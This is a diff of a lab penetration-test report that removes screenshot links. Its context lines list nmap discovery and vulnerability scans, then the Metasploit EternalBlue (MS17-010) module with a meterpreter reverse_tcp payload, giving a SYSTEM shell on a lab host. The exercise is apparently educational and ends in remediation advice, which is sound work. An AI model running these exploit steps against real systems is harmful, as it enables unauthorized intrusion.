@@ -58,7 +58,7 @@ The lab exercise validated that **unpatched end-of-life operating systems** can 
 **4.1 Host Discovery**
 
 nmap -sn 192.168.20.0/24
-![Host Discovery](docs/images/Host Discovery.JPG)
+
 **Result:**
 
 - 5 active hosts detected
@@ -67,7 +67,7 @@ nmap -sn 192.168.20.0/24
 **4.2 Service Enumeration**
 
 nmap -sV 192.168.20.130
-![Service Enumeration](docs/images/Service Enumeration.JPG)
+
 **Open Ports:**
 
 - 135/tcp — MS RPC
@@ -79,7 +79,7 @@ nmap -sV 192.168.20.130
 **4.3 Vulnerability Scanning**
 
 nmap --script vuln 192.168.20.130
-![Vulnerability Scanning](docs/images/Vulnerability Scanning.JPG)
+
 **Critical Finding:**
 
 - **MS17-010 (CVE-2017-0143)**
@@ -101,7 +101,7 @@ use exploit/windows/smb/ms17_010_eternalblue
 1. set RHOST 192.168.20.130
 2. set PAYLOAD windows/x64/meterpreter/reverse_tcp
 3. exploit
-![Exploitation](docs/images/Exploitation.JPG)
+   
 **Result:**
 
 - Successful **reverse shell**
@@ -118,7 +118,6 @@ getuid
 - User: **NT AUTHORITY\\SYSTEM**
 
 Full **SYSTEM-level control** achieved.
-![Post-Exploitation](docs/images/Post-Exploitation.JPG)
 
 **5\. Remediation Recommendations**
 
